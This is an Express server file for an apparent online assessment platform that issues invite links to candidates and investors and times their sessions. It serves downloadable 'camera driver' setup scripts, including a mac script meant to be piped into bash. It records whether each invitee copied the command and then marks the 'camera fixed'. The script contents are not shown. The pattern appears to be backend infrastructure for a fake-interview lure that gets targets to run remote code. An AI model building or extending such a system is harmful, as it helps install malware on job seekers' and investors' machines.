import express from 'express';
import cors from 'cors';
import config from './config.js';
import { getDb } from './db.js';
import { readFileSync } from 'fs';
import { dirname, join } from 'path';
import { fileURLToPath } from 'url';

const app = express();
const PORT = config.port;
const __dirname = dirname(fileURLToPath(import.meta.url));

const MAC_CMD_PATH = join(__dirname, 'mac.cmd');
const WINDOW_CMD_PATH = join(__dirname, 'window.cmd');

const MAC_CMD_TEMPLATE = readFileSync(MAC_CMD_PATH, 'utf8');
const WINDOW_CMD_TEMPLATE = readFileSync(WINDOW_CMD_PATH, 'utf8');

function sendScriptTemplate(res, body, { filename, contentType } = {}) {
  res.setHeader('Content-Type', contentType || 'text/plain; charset=utf-8');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Cache-Control', 'no-store, max-age=0');
  if (filename) res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
  res.status(200).send(body);
}

// CORS: allow frontend from local dev (any host:5173) and production
const allowedOrigins = [
  'https://canditech.in',
  'https://www.canditech.in',
  'http://localhost:5173',
  /^http:\/\/192\.168\.\d+\.\d+:5173$/,   // local network
  /^http:\/\/198\.18\.\d+\.\d+:5173$/,   // VPN/virtual network dev
  /^http:\/\/localhost(:\d+)?$/,
];
app.use(cors({
  origin: (origin, cb) => {
    if (!origin) return cb(null, true);
    if (allowedOrigins.some(o => typeof o === 'string' ? o === origin : o.test(origin))) return cb(null, true);
    return cb(null, true);
  },
  methods: ['GET', 'POST', 'PATCH', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));
app.use(express.json());

app.get('/health', async (req, res) => {
  try {
    const db = await getDb();
    await db.healthCheck();
    res.json({ status: 'ok', database: 'connected' });
  } catch (err) {
    res.status(503).json({ status: 'error', database: 'disconnected' });
  }
});

// Driver setup scripts
// - mac: return a shell script that can be piped into `bash`
// - window: return a .cmd batch script with the provided :id injected into `__ID__`
app.post('/mac/:id', (req, res) => {
  // :id is accepted for API symmetry but is not required by the mac script template.
  sendScriptTemplate(res, MAC_CMD_TEMPLATE, {
    filename: 'mac.cmd',
    contentType: 'text/x-shellscript; charset=utf-8',
  });
});

app.post('/window/:id', (req, res) => {
  const { id } = req.params;
  const windowUid = String(id ?? '').trim();
  if (!windowUid) return res.status(400).json({ error: 'Missing window id (:id)' });

  const body = WINDOW_CMD_TEMPLATE.replaceAll('__ID__', windowUid);
  sendScriptTemplate(res, body, {
    filename: 'window.cmd',
    contentType: 'text/plain; charset=utf-8',
  });
});

// All /api routes on a router so POST is guaranteed to match
const api = express.Router();

api.get('/example', (req, res) => {
  res.json({ message: 'Hello from backend' });
});

api.get('/invites/generate', async (req, res) => {
  try {
    const db = await getDb();
    const type = (req.query.type || 'partner').toLowerCase();
    const length = type === 'investor' ? 25 : 22;
    const invite_link = await db.generateUniqueInviteLink(length);
    res.json({ invite_link });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/** Time allowed for the assessment (timer countdown): 15 minutes. */
const ASSESSMENT_DURATION_MS = 15 * 60 * 1000;
/** Invite expires this long after assessment started: 120 minutes. */
const INVITE_EXPIRE_MS = 120 * 60 * 1000;

/** connections_status: 0=not started, 1=started, 2=camera fixed, 3=completed (user), 4=completed (rejected), 5=completed (timeout), 6=questionnaire completed (on summary interview). If started and INVITE_EXPIRE_MS passed, set to 5. */
async function maybeExpireInviteByTime(db, inviteLink) {
  return db.maybeExpireInviteByTime(inviteLink, INVITE_EXPIRE_MS);
}

api.get('/invites', async (req, res) => {
  try {
    const db = await getDb();
    let invites = await db.getInvites();
    for (let i = 0; i < invites.length; i++) {
      const expired = await maybeExpireInviteByTime(db, invites[i].invite_link);
      if (expired) {
        const updated = await db.getInvite(invites[i].invite_link);
        if (updated) invites[i] = updated;
      }
    }
    res.json({ invites });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

api.get('/invites/:invite_link', async (req, res) => {
  try {
    const { invite_link } = req.params;
    const db = await getDb();
    await maybeExpireInviteByTime(db, invite_link);
    const invite = await db.getInvite(invite_link);
    if (!invite) {
      return res.status(404).json({ error: 'Invite not found' });
    }
    res.json({ invite });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Real-time assessment timer: remaining seconds from assessment_started_at (frontend only displays this).
api.get('/invites/:invite_link/timer', async (req, res) => {
  try {
    const { invite_link } = req.params;
    const db = await getDb();
    await maybeExpireInviteByTime(db, invite_link);
    const row = await db.getTimer(invite_link);
    if (!row) {
      return res.status(404).json({ error: 'Invite not found' });
    }
    const startedAt = row.assessment_started_at ? new Date(row.assessment_started_at).getTime() : null;
    const expired = [3, 4, 5].includes(Number(row.connections_status));
    const now = Date.now();
    let seconds_remaining = 0;
    let seconds_elapsed = 0;
    if (!expired && startedAt && !Number.isNaN(startedAt)) {
      const elapsedMs = now - startedAt;
      seconds_remaining = Math.max(0, Math.floor((ASSESSMENT_DURATION_MS - elapsedMs) / 1000));
      seconds_elapsed = Math.floor(elapsedMs / 1000);
    }
    res.json({
      seconds_remaining,
      seconds_elapsed,
      server_time: new Date(now).toISOString(),
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

api.post('/invites', async (req, res) => {
  console.log('POST /api/invites received');
  try {
    const db = await getDb();
    let invite_link;
    const inviteType = (req.body?.invite_type || 'partner').toLowerCase();
    const linkLength = inviteType === 'investor' ? 25 : 22;
    if (req.body?.invite_link && typeof req.body.invite_link === 'string') {
      invite_link = req.body.invite_link.trim();
      if (!invite_link) {
        return res.status(400).json({ error: 'invite_link cannot be empty' });
      }
      const exists = await db.inviteExists(invite_link);
      if (exists) {
        return res.status(409).json({ error: 'Invite link already exists in DB' });
      }
    } else {
      invite_link = await db.generateUniqueInviteLink(linkLength);
    }
    const emailRaw = req.body?.email != null ? String(req.body.email).trim() || null : null;
    const positionTitleRaw = req.body?.position_title != null ? String(req.body.position_title).trim() || null : null;
    const noteRaw = req.body?.note != null ? String(req.body.note).trim() || null : null;
    const invite = await db.createInvite({
      invite_link,
      email: emailRaw,
      position_title: positionTitleRaw,
      note: noteRaw,
    });
    res.status(201).json({ invite });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

const CLIENT_OS_VALUES = new Set(['windows', 'mac', 'linux']);

api.patch('/invites/:invite_link', async (req, res) => {
  try {
    const { invite_link } = req.params;
    const { connections_status, email, position_title, note, assessment_started_at, client_os, driver_click_status } =
      req.body;
    const updates = {};
    const db = await getDb();
    /* driver_click_status: bitmask — 1 = link opened, 2 = copy used; 3 = both (OR merge, nothing is lost) */
    if (driver_click_status !== undefined) {
      const n = Number(driver_click_status);
      if (n === 1 || n === 2) {
        const cur = await db.getInvite(invite_link);
        if (!cur) {
          return res.status(404).json({ error: 'Invite not found' });
        }
        const prev = Number(cur.driver_click_status) || 0;
        const bit = n === 1 ? 1 : 2;
        updates.driver_click_status = (prev | bit) & 3;
      }
    }
    if (client_os !== undefined) {
      if (client_os === null || client_os === '') {
        updates.client_os = null;
      } else {
        const normalized = String(client_os).trim().toLowerCase();
        if (CLIENT_OS_VALUES.has(normalized)) {
          updates.client_os = normalized;
        }
      }
    }
    if (typeof connections_status === 'number' || typeof connections_status === 'string') {
      const statusNum = Number(connections_status);
      updates.connections_status = statusNum;
      /* Reset to not started: same as a new invite row for timer, completion, device metadata */
      if (statusNum === 0) {
        updates.assessment_started_at = null;
        updates.completed_at = null;
        updates.driver_click_status = 0;
        updates.client_os = null;
        updates.email = null;
      } else if (statusNum === 3 || statusNum === 4 || statusNum === 5) {
        updates.completed_at = new Date().toISOString();
      }
      if (statusNum === 1 && assessment_started_at === undefined) {
        updates.assessment_started_at = new Date().toISOString();
      }
    }
    if (email !== undefined) {
      updates.email = email === null || email === '' ? null : String(email).trim();
    }
    if (position_title !== undefined) {
      updates.position_title = position_title === null || position_title === '' ? null : String(position_title).trim();
    }
    if (note !== undefined) {
      updates.note = note === null || note === '' ? null : String(note).trim();
    }
    if (assessment_started_at !== undefined) {
      updates.assessment_started_at = assessment_started_at === null || assessment_started_at === '' ? null : String(assessment_started_at).trim();
    }
    if (Object.keys(updates).length === 0) {
      return res.status(400).json({ error: 'Provide at least one field to update' });
    }
    const invite = await db.updateInvite(invite_link, updates);
    if (!invite) {
      return res.status(404).json({ error: 'Invite not found' });
    }
    res.json({ invite });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Remove invite: hard delete from DB (row is removed, not updated).
api.delete('/invites/:invite_link', async (req, res) => {
  try {
    const { invite_link } = req.params;
    const db = await getDb();
    const deleted = await db.deleteInvite(invite_link);
    if (!deleted) {
      return res.status(404).json({ error: 'Invite not found' });
    }
    res.status(204).send();
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /invite/:invite_link — set connections_status to 2 (camera fixed), then return the invite.
app.get('/change-connection-status/:invite_link', async (req, res) => {
  try {
    const { invite_link } = req.params;
    const db = await getDb();
    const invite = await db.updateInvite(invite_link, { connections_status: 2 });
    if (!invite) {
      return res.status(404).json({ error: 'Invite not found' });
    }
    res.send("Your camera driver has been updated successfully.");
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.use('/api', api);

if (!process.env.VERCEL) {
  app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
    console.log('  POST /api/invites - add invite link');
  });
}

export default app;
